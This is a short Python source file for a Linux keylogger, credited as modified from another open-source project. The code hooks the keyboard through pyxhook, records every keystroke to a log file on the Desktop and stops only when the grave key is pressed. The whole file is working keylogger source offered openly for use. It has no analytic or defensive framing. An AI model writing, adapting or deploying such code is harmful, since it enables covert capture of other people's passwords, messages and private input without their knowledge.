"""
Copyright (c) 2018 Nicola Sella

Modified under the MIT licence from
Aman Deep's project: https://github.com/hiamandeep/py-keylogger

A simple keylogger witten in python for linux platform
All keystrokes are recorded in a log file.

The program terminates when grave key(`) is pressed

grave key is found below Esc key

"""
from username import username
import pyxhook
import encrypt
from encrypt import simpleCrypt

#change this to your log file's path
log_file='/home/' + username + '/Desktop/file.log'

class keylogger(simpleCrypt):
    def __init__(self, ascii_char, key = 'secret'):
        simpleCrypt.__init__(self, key = key)
        self.ascii_char = ascii_char

    #this function is called everytime a key is pressed.
    def OnKeyPress(self, event):
        fob=open(log_file,'a')
        fob.write(event.Key)
        fob.write('\n')
    
        if event.Ascii == self.ascii_char:
            fob.close()
            new_hook.cancel()

k = keylogger(96, 'key')
#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=k.OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()
